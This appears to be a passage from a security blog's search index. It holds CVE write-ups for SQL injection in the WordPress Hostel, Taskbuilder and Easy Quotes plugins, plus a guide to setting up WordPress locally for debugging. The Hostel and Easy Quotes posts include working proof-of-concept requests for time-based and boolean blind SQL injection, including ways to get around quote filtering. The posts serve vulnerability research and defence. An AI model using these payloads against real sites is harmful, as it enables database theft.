Taskbuilder Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e: v4.0.1 (vulnerable) and v4.0.2 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool that can compare files to see differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application \u003cstrong\u003esanitizes input data\u003c/strong\u003e before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes \u003ccode\u003e'...'\u003c/code\u003e. This allows an attacker to inject valid SQL syntax (such as \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e, etc.) into the query, resulting in a SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings — indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed → SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: “fish where the fish are” Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I’ll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine’s services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it’s usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won’t help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system’s hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB – 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB – 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you’ll see errors like:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 It’s recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lỗ hổng xảy ra trên plugin Easy Quotes của WordPress trước phiên bản 1.2.3. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) và v1.2.3(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Ứng dụng đã đưa trực tiếp dữ liệu từ người dùng vào câu query SQL mà không sử dụng các biện pháp bảo vệ khiến lỗ hổng SQL Injection xảy ra.\nPatch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } Bản vá sử dụng $wpdb-\u0026gt;prepare() thay vì truyền trực tiếp dữ liệu từ người dùng vào câu query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } Có nhiều hàm cũng được vá bằng cách trên, như: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() đã được vá nhưng nó không chứa dữ liệu từ người dùng, nên không cần quan tâm\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thác lỗi SQL Injection trong hàm get_family_data($family), các hàm còn lại khai thác tương tự.\nget_family_data() là hàm public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() được gọi trong 2 hàm get_family() và get_font_variants() của class Quotes_Data, để biết chúng sử dụng ở đâu, ta tìm kiến với từ khóa get_family hoặc get_font_variants\nHàm get_font_variants() được gọi trong hàm rest_route_callback_font_variants() của class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } Hàm khởi tạo của class Quotes_Rest_Route sử dụng add_action(hook_name, callback) với hook_name là rest_api_init để đăng ký các endpoint tùy chỉnh với REST API System của WordPress\nCallback rest_api_init sử dụng register_rest_route nhiều lần để tạo các endpoint dưới namespace layart/v1\nrest_route_callback_font_variants là callback của endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family mặc định là Shadows Into Light nếu không được truyền trong param.\nExploit Detect SQLi Ta thử kỹ thuật Boolean-based SQL Injection để kiểm tra xem tham số family có dễ bị chèn lệnh SQL hay không.\nTrue request: Khi đó, câu query thực thi sẽ trở thành:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Điều kiện AND '1'='1' luôn đúng =\u0026gt; query hợp lệ, trả về dữ liệu bình thường.\nFalse request: Khi đó, câu query thực thi sẽ trở thành:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Điều kiện AND '1'='2' luôn sai =\u0026gt; query không khớp =\u0026gt; trả về [].\nGet First Letter of Database Name Điều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì toàn bộ data đều dump được.\nDatabase name được tôi đặt tên là wordpress nên kí tự đầu tiên là w\nResponse trả về dữ liệu bình thường =\u0026gt; kí tự đầu tiên là w\nKhi đó, câu query thực thi sẽ trở thành:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion Lỗ hổng CVE-2025-26943 trong plugin WordPress Easy Quotes trước phiên bản 1.2.3 xuất phát từ việc không sử dụng cơ chế chuẩn bị truy vấn ($wpdb-\u0026gt;prepare) mà truyền trực tiếp dữ liệu từ người dùng vào câu lệnh SQL dẫn đến lỗ hổng SQL Injection.\nBản vá chính thức đã thay thế việc nối chuỗi bằng cách dùng $wpdb-\u0026gt;prepare, giúp đảm bảo dữ liệu đầu vào được kiểm soát và an toàn hơn.\nKey takeaways:\nLuôn sử dụng $wpdb-\u0026gt;prepare() khi làm việc với database trong WordPress để tránh SQL Injection. Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-23-cve-2025-26943.vi-copy/","summary":"\u003cp\u003eLỗ hổng xảy ra trên plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e của WordPress trước phiên bản \u003cstrong\u003e1.2.3\u003c/strong\u003e. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, 